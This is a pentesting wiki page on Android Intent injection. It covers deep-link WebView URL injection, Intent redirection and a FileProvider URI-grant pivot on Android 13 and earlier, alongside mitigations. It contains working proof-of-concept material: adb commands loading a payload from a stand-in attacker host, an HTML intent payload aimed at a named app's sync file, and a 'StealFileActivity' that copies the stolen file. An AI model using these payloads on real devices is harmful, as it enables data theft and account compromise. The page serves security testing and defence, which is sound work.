# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection abuses components that accept attacker-controlled Intents or data that is later converted into Intents. Two very common patterns during Android app pentests are:

- Passing crafted extras to exported Activities/Services/BroadcastReceivers that are later forwarded to privileged, non-exported components.
- Triggering exported VIEW/BROWSABLE deep links that forward attacker-controlled URLs into internal WebViews or other sensitive sinks.

## Deep links → WebView sink (URL parameter injection)

If an app exposes a custom scheme deep link such as:

```text
myscheme://com.example.app/web?url=<attacker_url>
```

and the receiving Activity forwards the `url` query parameter into a WebView, you can force the app to render arbitrary remote content in its own WebView context.

PoC via adb:

```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
  -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
  -d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```

Impact
- HTML/JS executes inside the app’s WebView profile.
- If JavaScript is enabled (by default or due to misordered checks), you can enumerate/use any exposed `@JavascriptInterface` objects, steal WebView cookies/local storage, and pivot.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Order-of-checks bug enabling JavaScript

A recurring bug is enabling JavaScript (or other permissive WebView settings) before the final URL allowlist/verification finishes. If early helpers accept your deep link and the WebView is configured first, your final load happens with JavaScript already enabled even if later checks are flawed or too late.

What to look for in decompiled code:
- Multiple helpers that parse/split/rebuild the URL differently (inconsistent normalization).
- Calls to `getSettings().setJavaScriptEnabled(true)` before the last host/path allowlist check.
- A pipeline like: parse → partial validate → configure WebView → final verify → loadUrl.

Mitigations
- Canonicalize once and validate strictly; fail closed.
- Only enable JavaScript after all checks pass and just before loading trusted content.
- Avoid exposing bridges to untrusted origins.

## Other classic Intent injection primitives

- startActivity/sendBroadcast using attacker-supplied `Intent` extras that are later re-parsed (`Intent.parseUri(...)`) and executed.
- Exported proxy components that forward Intents to non-exported sensitive components without permission checks.

---

## Automating exported-component testing (Smali-driven ADB generation)

When exported components expect specific extras, guessing payload shape causes time waste and false negatives. You can automate discovery of keys/types directly from Smali and emit ready-to-run adb commands.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: decompile and scan Smali for calls like `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` to infer which extras and fields are consumed by each component.
- Output: for every exported Activity/Service/Receiver/Provider, the tool prints a short explanation and the exact `adb shell am ...`/`cmd content ...` command with correctly typed flags.

Install
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```

Usage
```bash
python apk-components-inspector.py target.apk
```
Example output
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```

ADB am extras cheat sheet (type-aware flags)
- Strings: `--es key value` | String array: `--esa key v1,v2`
- Integers: `--ei key 123` | Int array: `--eia key 1,2,3`
- Booleans: `--ez key true|false`
- Longs: `--el key 1234567890`
- Floats: `--ef key 1.23`
- URIs (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- Component extra: `--ecn key com.pkg/.Cls`
- Null string extra: `--esn key`
- Common flags: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Pro tips for Providers
- Use `adb shell cmd content query|insert|update|delete ...` to hit ContentProviders without agents.
- For SQLi probing, vary `--projection` and `--where` (aka selection) when the underlying provider is SQLite-backed.

Full-pipeline automation (interactive executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
Helper script (merges continued lines, executes only lines starting with `adb`):
```python
import subprocess

def parse_adb_commands(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    commands = []
    current = []
    for line in lines:
        s = line.strip()
        if s.startswith("adb "):
            current = [s]
        elif s.startswith("#") or not s:
            if current:
                full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
                commands.append(full)
                current = []
        elif current:
            current.append(s)
    if current:
        full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
        commands.append(full)
    return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
    print(f"\nCommand {i}: {cmd}")
    input("Press Enter to execute this command...")
    try:
        r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
        print("Output:\n", r.stdout)
        if r.stderr:
            print("Errors:\n", r.stderr)
    except subprocess.CalledProcessError as e:
        print(f"Command failed with error:\n{e.stderr}")
```
Run on-device: the inspector is Python-based and works in Termux or rooted phones where `apktool`/`androguard` are available.

---

## Intent:// → content:// pivot via legacy URI grant (Android ≤ 13)

A powerful real-world chain on Android ≤ 13 combines:
- A browser (or any app) that accepts intent: URLs, parses them with Intent.parseUri(...), and then calls startActivity(intent) after a user prompt
- A victim app exposing a FileProvider (android:exported="false" is fine) with android:grantUriPermissions="true" for a narrowly scoped path (e.g., <cache-path name="sync" path="sync" />)
- Legacy framework behavior that auto-adds FLAG_GRANT_READ_URI_PERMISSION when the Intent carries certain text extras (e.g., EXTRA_TEXT or EXTRA_HTML_TEXT)

This enables a single-tap exfiltration of files addressed by content:// URIs owned by the victim app, even though the victim’s provider is non-exported and only grants via URI permissions.

Key idea (Android ≤ 13)
- If the sender Intent includes text/htmlText extras, the framework may implicitly add FLAG_GRANT_READ_URI_PERMISSION on startActivity(), causing the target to receive a temporary read grant for the Intent data URI.
- If the Intent’s data is a content://<victim.authority>/... URI served by a FileProvider with grantUriPermissions enabled, the receiving component can open it via ContentResolver.

When this bites
- Browsers that implement shouldOverrideUrlLoading → Intent.parseUri(...) → startActivity(intent) for intent: scheme URLs (after a one-tap “Open external app” dialog).
- Victim app stores sensitive artifacts in a FileProvider-mapped folder (e.g., cacheDir/sync) and expects to only share them via explicit grants.

Hunting checklist
- In browser/host APKs: search for Intent.parseUri(...), shouldOverrideUrlLoading, and NonHttp/“app link” code paths that end in context.startActivity(intent).
- In victim APKs: look for FileProvider declarations with grantUriPermissions=true and narrow paths in @xml/filepaths or provider_paths (paths, cache-path, files-path...). Identify exact content:// URIs that map to sensitive files.

PoC (launch via web, 1-tap social engineering)
- HTML payload auto-redirects the victim to an intent: URL whose data is the target content://, and sets a component= to an attacker-exported Activity. Include a TEXT extra to trigger the legacy auto-grant on Android ≤ 13:

```html
<meta http-equiv="refresh" content="1;url=
intent://com.duckduckgo.mobile.android.provider/sync/Sync%20Data%20Recovery%20-%20DuckDuckGo.pdf#Intent;
 scheme=content;action=android.intent.action.SEND;
 component=com.attacker.duckduckgopoc/.StealFileActivity;
 S.android.intent.extra.TEXT=sync;end" />
```

Receiver (attacker side)
```java
// StealFileActivity.java (excerpt)
Uri fileToSteal = getIntent().getData();
try (InputStream in = getContentResolver().openInputStream(fileToSteal);
     OutputStream out = new FileOutputStream(new File(getCacheDir(), "stolenfile"))) {
  byte[] buf = new byte[8192];
  int n; while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
}
```

Preconditions
- Device on Android 13 or earlier
- Browser processes intent: URLs and calls startActivity() (one-tap confirmation is OK)
- Victim app exposes a FileProvider with grantUriPermissions and the sensitive file lives under a mapped path

Notes and gotchas
- Intent-scheme URLs cannot embed Serializable extras; don’t rely on invoking non-exported Activities that require Serializable input. Prefer targeting your own exported Activity to read the granted content URI.
- Even with android:exported="false" on the FileProvider and narrow paths, unintended grants can still happen if a cooperating component (the browser) originates the Intent.

Defensive guidance (app/browser)
- If you must handle intent: URLs, reject or strictly validate ones carrying content:// data URIs. Deny-list your own authorities (e.g., content://<your.pkg>.provider/...).
- Strip dangerous extras; clear URI grant flags unless explicitly required. Avoid startActivity() on untrusted Intent.parseUri(...) without a strict allowlist.
- Do not store high-value artifacts in provider-mapped cache paths; encrypt-at-rest or place them outside provider mappings.

Platform guidance
- Prefer updated Android versions where this legacy auto-grant behavior no longer applies. On legacy devices, be explicit and minimal about URI grants.

---

## Intent Redirection (CWE-926) – finding and exploiting


Pattern
- An exported entry point (Activity/Service/Receiver) reads an incoming Intent and forwards it internally or externally without validating source/data, e.g.:
  - `startActivity(getIntent())`
  - `startActivity(intent)` where `intent` came from an extra like `redirect_intent`/`next_intent`/`pending_intent` or `Intent.parseUri(...)`.
  - Trusting `action`/`data`/`component` fields without checks; not verifying caller identity.

What to search in Smali/Java
- Uses of `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`.
- Direct `startActivity(...)`, `startService(...)`, `sendBroadcast(...)` on attacker-influenced Intents.
- Lack of `getCallingPackage()`/`getCallingActivity()` checks or custom permission gates.

ADB PoC templates
- Proxy Activity forwarding an extra Intent to a privileged internal Activity:
```bash
adb shell am start -n com.target/.ProxyActivity \
  --es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- Exported Service that honors a `redirect_intent` parcelable:
```bash
adb shell am startservice -n com.target/.ExportedService \
  --es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver that relays without validation:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
  --es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
Flags helpful for singleTask-style behavior
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```

Real-world examples (impact varies):
- CVE-2024-26131 (Element Android): exported flows leading to WebView manipulation, PIN bypass, login hijack.
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → system-level effects.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): redirection → arbitrary file access (w/ user interaction).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents leak content.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).

Mitigations (developer checklist)
- Do not forward incoming Intents directly; sanitize and re-construct allowed fields.
- Restrict exposure with `android:exported="false"` unless necessary. Protect exported components with permissions and signatures.
- Verify caller identity (`getCallingPackage()`/`getCallingActivity()`), and enforce explicit Intents for intra-app navigation.
- Validate both `action` and `data` (scheme/host/path) before use; avoid `Intent.parseUri` on untrusted input.

---

## References

- [Don't Leave Me Outdated! – Intent scheme to FileProvider pivot (Android ≤13)](https://tuxplorer.com/posts/dont-leave-me-outdated/)
- [AOSP Intent.java (Android 13) – legacy auto-grant behavior reference](https://cs.android.com/android/platform/superproject/+/android13-release:frameworks/base/core/java/android/content/Intent.java)

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)

{{#include ../../banners/hacktricks-training.md}}